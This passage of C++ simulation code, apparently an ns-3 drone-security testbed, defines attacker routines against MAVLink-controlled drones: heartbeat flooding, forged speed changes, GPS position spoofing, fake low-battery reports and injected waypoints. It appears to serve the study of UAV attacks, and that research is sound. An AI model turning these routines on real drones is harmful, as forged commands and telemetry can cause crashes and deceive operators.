        std::vector<uint8_t> heartbeat = CreateHeartbeatPacket(spoofed_id);
        Ptr<Packet> packet = Create<Packet>(heartbeat.data(), heartbeat.size());
        
        // Send to all real drones at a high rate
        for (uint32_t i = 0; i < droneIpAddresses.size(); i++) {
            socket->SendTo(packet, 0, InetSocketAddress(droneIpAddresses[i], 20000));
        }
    }
    
    NS_LOG_INFO("Attacker sent realistic heartbeat flood at " << Simulator::Now().GetSeconds() << "s");
    
    // Schedule next flood (every 0.05 seconds for high-rate flooding)
    if (Simulator::Now().GetSeconds() < 180.0) {
        Simulator::Schedule(Seconds(0.05), &ExecuteHeartbeatFloodAttack, socket);
    }
}


// Execute Speed Change attack
void ExecuteSpeedManipulationAttack(Ptr<Socket> socket) {
    // Slow down drone 1 and drone 2 (system IDs 2 and 3)
    float slowSpeed = 2.0f; // 2 m/s (slow speed)
    uint8_t speedType = 1;  // 1 = groundspeed
    
    std::vector<uint8_t> speed1 = CreateChangeSpeedPacket(2, speedType, slowSpeed); // Drone1 sysid=2
    std::vector<uint8_t> speed2 = CreateChangeSpeedPacket(3, speedType, slowSpeed); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(speed1.data(), speed1.size());
    Ptr<Packet> packet2 = Create<Packet>(speed2.data(), speed2.size()); 
    
    // Send to drone1 and drone2 on port 20000 (MAVLink port)
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 20000));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 20000));
    
    NS_LOG_INFO("Attacker sent speed reduction commands to drones 1 and 2 at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(speed1.data(), speed1.size());
        zmq::message_t zmqMsg2(speed2.data(), speed2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published speed manipulation commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 5 seconds) to maintain the slow speed
    if (Simulator::Now().GetSeconds() < 180.0) {
        Simulator::Schedule(Seconds(5.0), &ExecuteSpeedManipulationAttack, socket);
    }
}

// Execute drones location spoofing attack
void ExecuteSpoofDroneGPSAttack(Ptr<Socket> socket) {
    double Lat = 41.3879;
    double Lon = 2.16992;
    double Alt = 60.0;

    // Spoof positions for all drones (system IDs 1, 2, 3) to appear at Barcelona
    for (uint8_t system_id = 1; system_id <= 3; system_id++) {
        std::vector<uint8_t> spoofPacket = CreateQgcLocationSpoofPacket(system_id, Lat, Lon, Alt);
        
        // Send to ZMQ instead of directly to QGroundControl
        if (g_commandPublisher) {
            zmq::message_t zmqMsg(spoofPacket.data(), spoofPacket.size());
            g_commandPublisher->send(zmqMsg, zmq::send_flags::none);
        }
        
        NS_LOG_INFO("Attacker sent spoofed position for drone " << (int)system_id 
                    << " to ZMQ at " << Simulator::Now().GetSeconds() << "s");
    }
    
    // Schedule next update (every 0.1 seconds)
    if (Simulator::Now().GetSeconds() < 180.0) {
        Simulator::Schedule(Seconds(0.1), &ExecuteSpoofDroneGPSAttack, socket);
    }
}

// Execute battery percentage spoofing attack
void ExecuteBatteryPercentageSpoofingAttack(Ptr<Socket> socket) {
    NS_LOG_INFO("Executing battery percentage spoofing attack at " << Simulator::Now().GetSeconds() << "s");
    
    // Critical battery values
    uint8_t battery_id = 0;                  // Main battery
    uint8_t battery_function = MAV_BATTERY_FUNCTION_ALL;
    uint8_t battery_type = MAV_BATTERY_TYPE_LIPO;
    int16_t temperature = INT16_MAX;         // Unknown temperature
    uint16_t critical_voltage = 11000;       // 11V (critical level)
    int16_t current_battery = -1;            // Unknown current
    int32_t current_consumed = -1;           // Unknown consumption
    int32_t energy_consumed = -1;            // Unknown energy
    int8_t low_remaining = 5;                // 5% remaining
    
    // Create spoofed battery packets for all drones
    std::vector<uint8_t> battery1 = CreateSpoofedBatteryStatusPacket(
        1, battery_id, battery_function, battery_type, temperature, 
        critical_voltage, current_battery, current_consumed, 
        energy_consumed, low_remaining
    );
    
    std::vector<uint8_t> battery2 = CreateSpoofedBatteryStatusPacket(
        2, battery_id, battery_function, battery_type, temperature, 
        critical_voltage, current_battery, current_consumed, 
        energy_consumed, low_remaining
    );
    
    std::vector<uint8_t> battery3 = CreateSpoofedBatteryStatusPacket(
        3, battery_id, battery_function, battery_type, temperature, 
        critical_voltage, current_battery, current_consumed, 
        energy_consumed, low_remaining
    );
    
    Ptr<Packet> packet1 = Create<Packet>(battery1.data(), battery1.size());
    Ptr<Packet> packet2 = Create<Packet>(battery2.data(), battery2.size());
    Ptr<Packet> packet3 = Create<Packet>(battery3.data(), battery3.size());
    
    // Send to all drones (spoofed messages appear to come from each drone itself)
    for (uint32_t i = 0; i < droneIpAddresses.size(); i++) {
        // Send to port 20000 where drones listen for MAVLink messages
        socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[i], 20000));
        socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[i], 20000));
        socket->SendTo(packet3, 0, InetSocketAddress(droneIpAddresses[i], 20000));
        
        NS_LOG_INFO("Sent spoofed battery status packets to drone " << i << " at " << droneIpAddresses[i]);
    }
    
    // Publish to ZMQ for external monitoring
    if (g_commandPublisher) {
        try {
            zmq::message_t zmqMsg1(battery1.data(), battery1.size());
            zmq::message_t zmqMsg2(battery2.data(), battery2.size());
            zmq::message_t zmqMsg3(battery3.data(), battery3.size());
            g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
            g_commandPublisher->send(zmqMsg2, zmq::send_flags::sndmore);
            g_commandPublisher->send(zmqMsg3, zmq::send_flags::none);
            NS_LOG_INFO("Published battery status spoof packets to ZMQ");
        } catch (const zmq::error_t& e) {
            NS_LOG_ERROR("ZMQ error: " << e.what());
        }
    }
    
    // Schedule next attack (every 2 seconds)
    if (Simulator::Now().GetSeconds() < 180.0) {
        Simulator::Schedule(Seconds(2.0), &ExecuteBatteryPercentageSpoofingAttack, socket);
    }
}


// SendWaypointPairFromAttacker
// This function sends a pair of waypoints to both drones 1(system id 2 ) and drone 2(system id 3) from the attacker node
void SendWaypointPairFromAttacker(int pairIndex) {
    // Use the attacker node to send mission items, similar to SendWaypointPairFromDrone0 but with more waypoints
    Ptr<Node> attackerNode = Attacker.Get(0);
    Ptr<Socket> socket = Socket::CreateSocket(attackerNode, UdpSocketFactory::GetTypeId());
    socket->Bind();

    // Define more waypoints for each drone
    static const std::vector<std::tuple<float, float, float>> drone1_waypoints = {
        {50, 60, 30}, {10, 30, 30}, {60, 10, 30}, {70, 80, 40}, {90, 100, 50}, {110, 120, 60}, {130, 140, 70}
    };
    static const std::vector<std::tuple<float, float, float>> drone2_waypoints = {
        {50, 60, 30}, {20, 60, 30}, {20, 30, 30}, {80, 20, 40}, {100, 90, 50}, {120, 110, 60}, {140, 130, 70}
    };

    // Check if the requested waypoint pair index is valid
    if (pairIndex < 0 || pairIndex >= static_cast<int>(drone1_waypoints.size())) return;

    // Send all waypoints up to pairIndex to both drones
    for (int i = 0; i <= pairIndex; ++i) {
        auto [lat1, lon1, alt1] = drone1_waypoints[i];
        auto [lat2, lon2, alt2] = drone2_waypoints[i];

        std::vector<uint8_t> pkt1 = CreateMavlinkMissionPacket(2, 0, lat1, lon1, alt1);
        std::vector<uint8_t> pkt2 = CreateMavlinkMissionPacket(3, 0, lat2, lon2, alt2);

        Ptr<Packet> packet1 = Create<Packet>(pkt1.data(), pkt1.size());
        Ptr<Packet> packet2 = Create<Packet>(pkt2.data(), pkt2.size());

        socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
        socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));

        if (g_commandPublisher) {
            zmq::message_t zmqMsg1(pkt1.data(), pkt1.size());
            zmq::message_t zmqMsg2(pkt2.data(), pkt2.size());
            g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
            g_commandPublisher->send(zmqMsg2, zmq::send_flags::sndmore);
        }
    }
    // Log the sending event with the current simulation time
    NS_LOG_INFO("Attacker sent " << (pairIndex+1) << " waypoint pairs to drones at " << Simulator::Now().GetSeconds() << "s");
}
